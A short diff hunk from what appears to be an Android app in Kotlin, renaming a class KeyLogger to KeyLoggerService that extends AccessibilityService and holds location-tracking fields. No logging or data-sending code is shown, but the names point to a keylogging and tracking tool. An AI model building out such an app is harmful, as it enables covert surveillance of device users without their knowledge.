@@ -24,7 +24,7 @@ import java.text.SimpleDateFormat
 import java.util.Date
 
 
-class KeyLogger : AccessibilityService() {
+class KeyLoggerService : AccessibilityService() {
 
     private lateinit var fusedLocationClient: FusedLocationProviderClient
     private lateinit var locationCallback: LocationCallback
